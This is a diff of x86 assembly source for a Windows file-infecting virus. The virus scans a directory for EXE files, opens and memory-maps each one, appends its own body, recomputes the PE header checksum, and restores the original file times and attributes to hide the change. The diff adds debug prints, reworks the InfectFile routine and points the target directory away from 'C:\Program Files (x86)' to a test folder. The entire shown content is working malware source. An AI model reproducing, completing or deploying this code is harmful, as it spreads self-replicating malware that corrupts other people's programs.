@@ -52,7 +52,6 @@ struc DATA
     .fileAlign:               resd 1
     .memoryToReserve:         resd 1
     .infectionFlag:           resd 1
-    .fileOffset:              resd 1    ;removable
     .fileAttributes:          resd 1
     .newFileSize:             resd 1
     .fileHandle:              resd 1
@@ -293,10 +292,7 @@ compareEXE:
     jne     next_file
 
     ; IF FILE AND EXE, THEN INFECT
-    PRINTS  "FILE", [ebp + DATA.searchPath]
-    
-    mov     esi, [ebp + DATA.findData + FIND_DATA.cFileName]    ; read pointer to file name
-    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
+    PRINTS  "FILE", [ebp + DATA.searchPath]    
     call    InfectFile
     
     dec     dword [ebp + DATA.counter]      ; decrement counter and loop again
@@ -357,62 +353,33 @@ search_done:
 ;; HELPER FUNCTIONS
 ;; ====================================================================================
 
-;; Calculates the checksum that is to be stored in the PE header
-;;  Input:  edx - buffer pointer, ecx - buffer length
-;;  Output: eax - the checksum
-PECheckSum:
-    push    ecx         ; save the length for later
-    shr     ecx, 2      ; we're summing DWORDs, not bytes 
-    xor     eax, eax    ; EAX holds the checksum     
-    clc                 ; Clear the carry flag ready for later... 
-    
-    theLoop: ; the file is being iterated backwards
-    adc	eax, [edx + (ecx * 4) - 4] 
-    dec	ecx 
-    jnz	theLoop 
-
-    mov     ecx, eax       ; EDX = EAX - the checksum
-    shr     ecx, 16        ; EDX = checksum >> 16      EDX is high order
-    and     eax, 0xFFFF    ; EAX = checksum & 0xFFFF   EAX is low order
-    add     eax, ecx       ; EAX = checksum & 0xFFFF + checksum >> 16      High Order Folded into Low Order
-    mov     ecx, eax       ; EDX = checksum & 0xFFFF + checksum >> 16    
-    shr     ecx, 16        ; EDX = EDX >> 16      EDX is high order
-    add     eax, ecx       ; EAX = EAX + EDX      High Order Folded into Low Order
-    and     eax, 0xFFFF    ; EAX = EAX & 0xFFFF   EAX is low order 16 bits    
-    
-    pop     ecx            ; restore original file length
-    add     eax, ecx       ; add the file size
-    
-    retn 
-
-
-;; Infects a file
-;;  Input: esi = filename, ecx = filesize
 InfectFile:
     pushad                                          ; Save all registers
 
-    PRINTD "originalFileSize", ecx
-    mov     [ebp + DATA.newFileSize], ecx           ; Save file size, old size at this point
     xor     ebx, ebx
     mov     [ebp + DATA.infectionFlag], ebx         ; Reset the infection flag
+    
+    mov     ecx, [ebp + DATA.findData + FIND_DATA.nFileSizeLow] ; read file size (lower 4 bytes)
+    PRINTD "originalFileSize", ecx
+    mov     [ebp + DATA.newFileSize], ecx           ; YYY Save file size, old size at this point
     add     ecx, virusLen                           ; ECX = victim filesize + virus
     add     ecx, 1000h                              ; ECX = victim filesize + virus + 1000h
-    mov     [ebp + DATA.memoryToReserve], ecx           ; Memory to map
-    PRINT_TRACE ;1
+    mov     [ebp + DATA.memoryToReserve], ecx       ; Memory to map
+    PRINTD "memoryToReserve", ecx
 
     ;; save the original attributes
 
-    mov     [ebp + DATA.fileOffset], esi            ; ESI = pointer to filename ***
-    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
+    lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.GetFileAttributesA]         ; Get the file attributes
-    cmp     eax, 0
+    cmp     eax, -1                                 ; YYY
     mov     [ebp + DATA.fileAttributes], eax
+    PRINTH  "fileAttributes", eax
 
     ;; set the nomral attributes to the file
 
     push    80h                                     ; 80h = FILE_ATTRIBUTE_NORMAL
-    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
+    lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Address to filename
     call    [ebp + DATA.SetFileAttributesA]         ; Get the file attributes
 
@@ -426,14 +393,13 @@ InfectFile:
     mov     ebx, WRITABLE
     or      ebx, READABLE
     push    ebx                                     ; General write and read
-    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
+    lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Address to filename
-    call    [ebp + DATA.CreateFileA]                ; create the file
-                                                    ; EAX = file handle
-
-    mov     [ebp + DATA.fileHandle], eax            ; Save file handle
+    call    [ebp + DATA.CreateFileA]                ; create the file, EAX = file handle
     cmp     eax, -1                                 ; error ?
     je      InfectionError                          ; cant open the file ?
+    mov     [ebp + DATA.fileHandle], eax            ; Save file handle
+    PRINTH  "fileHandle", eax
 
     ;; save File creation time, Last write time, Last access time
 
@@ -445,10 +411,19 @@ InfectFile:
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
     push    ebx
-    call    [ebp + DATA.GetFileTime]                ; save time fields FIXME
+    call    [ebp + DATA.GetFileTime]                
+    PRINTD  "GetFileTime", eax
 
     ;; create file mapping for the file
-
+;HANDLE WINAPI CreateFileMapping(
+;  _In_     HANDLE                hFile,
+;  _In_opt_ LPSECURITY_ATTRIBUTES lpAttributes,
+;  _In_     DWORD                 flProtect,
+;  _In_     DWORD                 dwMaximumSizeHigh,
+;  _In_     DWORD                 dwMaximumSizeLow,
+;  _In_opt_ LPCTSTR               lpName
+;);
+;
     push    0                                       ; Filename handle = NULL
     mov     ebx, [ebp + DATA.memoryToReserve]           ; Max size
     push    ebx
@@ -457,12 +432,13 @@ InfectFile:
     push    0                                       ; Security attributes
     mov     ebx, [ebp + DATA.fileHandle]            ; File handle
     push    ebx
-    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory
-                                                    ; EAX = new map handle
-
-    mov     [ebp + DATA.mapHandle], eax             ; Save map handle
+    call    [ebp + DATA.CreateFileMappingA]         ; map file to memory, EAX = new map handle
+    call    _GetLastError@0
+    PRINTD  "CreateFileMapping handle", eax
     cmp     eax, 0                                  ; Error ?
     je      CloseFile                               ; Cant map file ?
+    mov     [ebp + DATA.mapHandle], eax             ; Save map handle
+    ;PRINTD  "CreateFileMapping handle", eax
 
     ;; map the view of that file
 
@@ -769,7 +745,7 @@ CloseFile:
 
     mov     ebx, [ebp + DATA.fileAttributes]
     push    ebx
-    lea     ebx, [ebp + DATA.findData + FIND_DATA.cFileName]
+    lea     ebx, [ebp + DATA.searchPath]
     push    ebx                                     ; Push the address of the search record
     PRINT_TRACE
     call    [ebp + DATA.SetFileAttributesA]
@@ -795,10 +771,39 @@ OutOfHere:
     retn
 
 
+;; Calculates the checksum that is to be stored in the PE header
+;;  Input:  edx - buffer pointer, ecx - buffer length
+;;  Output: eax - the checksum
+PECheckSum:
+    push    ecx         ; save the length for later
+    shr     ecx, 2      ; we're summing DWORDs, not bytes 
+    xor     eax, eax    ; EAX holds the checksum     
+    clc                 ; Clear the carry flag ready for later... 
+    
+    theLoop: ; the file is being iterated backwards
+    adc	eax, [edx + (ecx * 4) - 4] 
+    dec	ecx 
+    jnz	theLoop 
+
+    mov     ecx, eax       ; EDX = EAX - the checksum
+    shr     ecx, 16        ; EDX = checksum >> 16      EDX is high order
+    and     eax, 0xFFFF    ; EAX = checksum & 0xFFFF   EAX is low order
+    add     eax, ecx       ; EAX = checksum & 0xFFFF + checksum >> 16      High Order Folded into Low Order
+    mov     ecx, eax       ; EDX = checksum & 0xFFFF + checksum >> 16    
+    shr     ecx, 16        ; EDX = EDX >> 16      EDX is high order
+    add     eax, ecx       ; EAX = EAX + EDX      High Order Folded into Low Order
+    and     eax, 0xFFFF    ; EAX = EAX & 0xFFFF   EAX is low order 16 bits    
+    
+    pop     ecx            ; restore original file length
+    add     eax, ecx       ; add the file size
+    
+    retn 
+
+
     ;; Constant data section
     ;; ====================================================================================
 
-    directory:                db "C:\Program Files (x86)", 0
+    directory:                db "C:\assembly\Dummies", 0
     message:                  db 'Good morning America!', 10
     message_end:
 
